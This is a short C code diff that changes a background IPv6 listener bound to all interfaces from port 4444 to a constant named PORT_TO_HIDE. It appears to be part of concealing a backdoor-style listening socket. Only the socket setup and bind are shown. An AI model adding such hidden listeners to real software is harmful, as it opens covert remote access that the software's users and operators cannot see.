@@ -64,7 +64,7 @@ void run_background_listener() {
     struct sockaddr_in6 addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(4444);
+    addr.sin6_port = htons(PORT_TO_HIDE);
     addr.sin6_addr = in6addr_any; 
 
     if (bind(listen_socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
